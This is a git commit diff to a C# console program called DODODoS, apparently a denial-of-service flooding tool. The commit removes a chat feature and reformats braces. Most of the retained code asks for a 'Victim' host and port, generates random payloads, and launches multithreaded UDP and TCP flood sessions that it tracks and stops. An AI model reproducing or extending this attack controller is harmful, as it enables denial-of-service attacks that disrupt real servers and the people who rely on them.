7a304581af0e7084bdeaa2b64a30c0da7b5da62a
SuperBonny <bonora.matteo@gmail.com>
2015-10-20 12:37:21 +0200

    Remove chat

--- DODODoS/DODODoS/Program.cs
+++ DODODoS/DODODoS/Program.cs
@@ -8,27 +8,29 @@ using System.Net;
 using Chat;
 using System.Net.Sockets;
 
-namespace DODODoS {
-    class Program {
+namespace DODODoS
+{
+    class Program
+    {
         static Dictionary<String, Action> cmd;
         static List<Tuple<string, UDP>> UdpVictims = new List<Tuple<string, UDP>>();
         static List<Tuple<string, TCP>> TcpVictims = new List<Tuple<string, TCP>>();
         static string pluginPath = "plugins";
-        static string[] ChatBuffer = new string[Console.WindowHeight - 5];
-        static int ptr = 0;
 
         static object toLockSyncThread = new object();
         static object toLockSyncHiddenNot = new object();
         static object toLockChat = new object();
 
-        static void Main(string[] args) {
+        static void Main(string[] args)
+        {
             //Console.CancelKeyPress += Console_CancelKeyPress;
             bool exit = true;
             //CreateFakeConsole();
             LoadCommands();
             Help();
-            
-            while (exit) {
+
+            while (exit)
+            {
                 lock (toLockSyncHiddenNot) { Console.Write("DODODoS> "); } //This will leave the thread in a holded state as if it has been paused when the ddos is hidden
                 string command = Console.ReadLine(); //Control+C will leave a null string resulting in Argument Exception
                 if (command != null && cmd.ContainsKey(command)) //No argument Exception cause the first check is on the null
@@ -41,7 +43,8 @@ namespace DODODoS {
         /// <summary>
         /// Loads the commands in the dictionary
         /// </summary>
-        static void LoadCommands() {
+        static void LoadCommands()
+        {
             #region <USELESS CODE>
             ConsoleColor tmp = Console.ForegroundColor;
             Console.ForegroundColor = Console.BackgroundColor;
@@ -65,11 +68,11 @@ namespace DODODoS {
             }
 
             cmd.Add("help", new Action(Help));
-            //cmd.Add("chat", new Action(StartChat));   REMOVED UNTIL IT WORKS
             cmd.Add("exit", new Action(Exit));
 
         }
-        static void GetLocalIP() {
+        static void GetLocalIP()
+        {
             string IP4Address = String.Empty;
 
             foreach (IPAddress IPA in Dns.GetHostAddresses(Dns.GetHostName()))
@@ -83,48 +86,58 @@ namespace DODODoS {
 
             Console.WriteLine("My IP: " + IP4Address);
         }
-        static void Exit() {
+        static void Exit()
+        {
             Environment.Exit(0);
         }
-        static void Clear() {
+        static void Clear()
+        {
             Console.Clear();
         }
         /// <summary>
         /// Prints the list of commands
         /// </summary>
-        static void Help() {
+        static void Help()
+        {
             Console.WriteLine("Available commands:");
-            foreach (string s in cmd.Keys) {
+            foreach (string s in cmd.Keys)
+            {
                 Console.WriteLine("  " + s);
             }
         }
         /// <summary>
         /// Lists all current attacks
         /// </summary>
-        static void List() {
+        static void List()
+        {
             int count = 0;
-            if (UdpVictims.Count > 0) {
+            if (UdpVictims.Count > 0)
+            {
                 Console.WriteLine("UDP sessions:");
                 /*foreach (Tuple<string, UDP> victim in UdpVictims)
                     Console.WriteLine("   {0}", victim.Item1);*/
                 for (; count < UdpVictims.Count; count++)
                     Console.WriteLine(" {0}.  {1}", count, UdpVictims[count].Item1);
-            } else
+            }
+            else
                 Console.WriteLine("No UDP sessions.");
 
-            if (TcpVictims.Count > 0) {
+            if (TcpVictims.Count > 0)
+            {
                 Console.WriteLine("TCP sessions:");
                 /*foreach (Tuple<string, TCP> victim in TcpVictims)
                     Console.WriteLine("   {0}", victim.Item1);*/
                 for (int i = 0; i < TcpVictims.Count; count++, i++)
                     Console.WriteLine(" {0}.  {1}", count, TcpVictims[i].Item1);
-            } else
+            }
+            else
                 Console.WriteLine("No TCP sessions.");
         }
         /// <summary>
         /// Starts a UDP attack
         /// </summary>
-        static void UDP() {
+        static void UDP()
+        {
             string host;
             int port;
             byte[] message;
@@ -138,7 +151,8 @@ namespace DODODoS {
         /// <summary>
         /// Starts a TCP attack
         /// </summary>
-        static void TCP() {
+        static void TCP()
+        {
             string host;
             int port;
             byte[] message;
@@ -149,11 +163,13 @@ namespace DODODoS {
             t = new TCP();
             bool conn = t.Connect(host, port);
 
-            for (int i = 0; i < 5 && !conn; i++) {
+            for (int i = 0; i < 5 && !conn; i++)
+            {
                 Console.WriteLine("Can't connect. Retrying...");
                 conn = t.Connect(host, port);
             }
-            if (conn) {
+            if (conn)
+            {
                 TcpVictims.Insert(0, new Tuple<string, TCP>(host + ":" + port, t));
                 TcpVictims[0].Item2.Attack(message, Environment.ProcessorCount * 2);
             }
@@ -161,27 +177,37 @@ namespace DODODoS {
         /// <summary>
         /// Stops all running attacks
         /// </summary>
-        static void Stop() {
+        static void Stop()
+        {
             Console.WriteLine("Wich session do you want to stop?");
             List();
             Console.Write("[All]> ");
             int n = -1;
-            try {
+            try
+            {
                 n = Convert.ToInt32(Console.ReadLine());
-            } catch {
             }
-            if (n == -1) {
+            catch
+            {
+            }
+            if (n == -1)
+            {
                 foreach (Tuple<string, UDP> victim in UdpVictims)
                     victim.Item2.Stop();
                 foreach (Tuple<string, TCP> victim in TcpVictims)
                     victim.Item2.Stop();
                 UdpVictims.Clear();
                 TcpVictims.Clear();
-            } else {
-                if (n > UdpVictims.Count - 1) {
+            }
+            else
+            {
+                if (n > UdpVictims.Count - 1)
+                {
                     TcpVictims[n - (UdpVictims.Count)].Item2.Stop();
                     TcpVictims.RemoveAt(n - (UdpVictims.Count));
-                } else {
+                }
+                else
+                {
                     UdpVictims[n].Item2.Stop();
                     UdpVictims.RemoveAt(n);
                 }
@@ -194,16 +220,20 @@ namespace DODODoS {
         /// <param name="host">The host name or ip of the victim</param>
         /// <param name="port">The port of the victim</param>
         /// <param name="message">the message to send</param>
-        static void Collect(out string host, out int port, out byte[] message) {
+        static void Collect(out string host, out int port, out byte[] message)
+        {
             Console.Write("Victim: ");
             host = Console.ReadLine();
             Console.Write("Port: ");
             port = Convert.ToInt32(Console.ReadLine());
             Console.Write("Random string or message? [R/M]: ");
-            if (Console.ReadLine() == "r") {
+            if (Console.ReadLine() == "r")
+            {
                 Console.Write("String lenght: ");
                 message = Generate(Convert.ToInt32(Console.ReadLine()));
-            } else {
+            }
+            else
+            {
                 Console.Write("Message: ");
                 message = Encoding.ASCII.GetBytes(Console.ReadLine());
             }
@@ -213,7 +243,8 @@ namespace DODODoS {
         /// </summary>
         /// <param name="lenght">The lenght of the array to be generated</param>
         /// <returns>The array</returns>
-        static byte[] Generate(int lenght) {
+        static byte[] Generate(int lenght)
+        {
             byte[] b = new byte[lenght];
             for (int i = 0; i < lenght; i++)
                 b[i] = Convert.ToByte(new Random().Next(255));
@@ -233,72 +264,13 @@ namespace DODODoS {
             };
             plg.StartInfo = psi;
             plg.Start();
-            while(!plg.StandardOutput.EndOfStream)
+            while (!plg.StandardOutput.EndOfStream)
                 while (!plg.StandardOutput.EndOfStream)
                 {
                     Console.WriteLine(plg.StandardOutput.ReadLine());
                 }
-                plg.StandardInput.WriteLine(Console.ReadLine());
+            plg.StandardInput.WriteLine(Console.ReadLine());
             return true;
-
         }
-
-        static void StartChat() {
-            Console.Clear();
-            consoleInterface.DrawTop("DodoSWAG CHAT 1.00");
-            consoleInterface.WriteDirect(3, 0, "<sys>Username: ");
-            string username = Console.ReadLine();
-            string message = "";
-            new Thread(() => {
-                while (true) {
-                    var v = littleChat.Receive();
-                    EditChatBuffer(v);
-
-                    consoleInterface.DrawTop("DodoSWAG CHAT 1.00");
-                    for (int i = 0; i < ChatBuffer.Length; i++) {
-                        consoleInterface.WriteDirect(i + 3, 1, ChatBuffer[i]);
-                    }
-
-                }
-
-            }) { IsBackground = true }.Start();
-            new Thread(() => {
-                while (true) {
-                    WriteChatBuffer();
-                    Thread.Sleep(1000);
-                }
-            }) { IsBackground = true }.Start();
-            while (message != "/exit") {
-                consoleInterface.WriteDirect(Console.WindowHeight - 1, 0, " > ");
-                message = "<" + username + ">" + Console.ReadLine();
-                consoleInterface.DrawTop("DodoSWAG CHAT 1.00");
-                littleChat.Send(message);
-                EditChatBuffer(message);
-            }
-
-
-        }
-        static void EditChatBuffer(string l) {
-            consoleInterface.ClearLine(ptr + 4);
-            if (ptr < ChatBuffer.Length) {
-                ChatBuffer[ptr] = l;
-                ptr++;
-            } else {
-                ptr = 0;
-                ChatBuffer[ptr] = l;
-
-            }
-
-        }
-        static void WriteChatBuffer() {
-            var top = Console.WindowHeight - 1;
-            var left = Console.CursorLeft;
-            for (int i = 0; i < ChatBuffer.Length; i++) {
-                consoleInterface.WriteDirect(i + 4, 1, ChatBuffer[i] ?? "");
-            }
-            Console.CursorTop = top;
-            Console.CursorLeft = left;
-        }
-
     }
 }
